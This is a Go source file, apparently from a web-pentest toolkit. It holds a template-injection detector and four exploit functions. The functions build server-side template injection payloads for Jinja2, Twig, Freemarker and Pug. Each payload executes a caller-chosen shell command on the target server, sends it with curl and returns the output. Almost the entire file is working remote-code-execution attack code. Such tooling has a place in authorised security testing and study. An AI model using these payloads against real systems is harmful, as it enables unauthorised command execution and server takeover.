package websecurity

import (
	"fmt"
	"net/url"
	"strings"
)

func SSTIDetect(target, param string) (string, error) {
	payloads := []string{
		"{{7*7}}",
		"${7*7}",
		"#{7*7}",
		"<%=7*7%>",
		"${{7*7}}",
	}
	var results []string
	for _, p := range payloads {
		fullURL := fmt.Sprintf("%s?%s=%s", strings.TrimRight(target, "?"), param, url.QueryEscape(p))
		cmd := throttledExec("curl", "-s", fullURL)
		out, err := cmd.CombinedOutput()
		if err != nil {
			continue
		}
		body := string(out)
		if strings.Contains(body, "49") || strings.Contains(body, "7*7") {
			results = append(results, fmt.Sprintf("%s: vulnerable", p))
		} else {
			results = append(results, fmt.Sprintf("%s: not_detected", p))
		}
	}
	return fmt.Sprintf("SSTI detection on %s via %s: %s", target, param, strings.Join(results, " | ")), nil
}

func SSTIJinja2(target, param, cmd string) (string, error) {
	payload := fmt.Sprintf("{{''.__class__.__mro__[2].__subclasses__()|attr('__getitem__')(132).__init__.__globals__['os'].popen('%s').read()}}", cmd)
	fullURL := fmt.Sprintf("%s?%s=%s", strings.TrimRight(target, "?"), param, url.QueryEscape(payload))
	cmdExec := throttledExec("curl", "-s", fullURL)
	out, err := cmdExec.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("Jinja2 SSTI failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("Jinja2 SSTI on %s via %s with command %s: %s", target, param, cmd, strings.TrimSpace(string(out))[:minInt(len(out), 300)]), nil
}

func SSTITwig(target, param, cmd string) (string, error) {
	payload := fmt.Sprintf("{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('%s')}}", cmd)
	fullURL := fmt.Sprintf("%s?%s=%s", strings.TrimRight(target, "?"), param, url.QueryEscape(payload))
	cmdExec := throttledExec("curl", "-s", fullURL)
	out, err := cmdExec.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("Twig SSTI failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("Twig SSTI on %s via %s with command %s: %s", target, param, cmd, strings.TrimSpace(string(out))[:minInt(len(out), 300)]), nil
}

func SSTIFreemarker(target, param, cmd string) (string, error) {
	payload := fmt.Sprintf("<#assign ex='freemarker.template.utility.Execute'?new()>${ ex('%s') }", cmd)
	fullURL := fmt.Sprintf("%s?%s=%s", strings.TrimRight(target, "?"), param, url.QueryEscape(payload))
	cmdExec := throttledExec("curl", "-s", fullURL)
	out, err := cmdExec.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("Freemarker SSTI failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("Freemarker SSTI on %s via %s with command %s: %s", target, param, cmd, strings.TrimSpace(string(out))[:minInt(len(out), 300)]), nil
}

func SSTIPug(target, param, cmd string) (string, error) {
	payload := fmt.Sprintf("= require('child_process').execSync('%s')", cmd)
	fullURL := fmt.Sprintf("%s?%s=%s", strings.TrimRight(target, "?"), param, url.QueryEscape(payload))
	cmdExec := throttledExec("curl", "-s", fullURL)
	out, err := cmdExec.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("Pug SSTI failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("Pug SSTI on %s via %s with command %s: %s", target, param, cmd, strings.TrimSpace(string(out))[:minInt(len(out), 300)]), nil
}
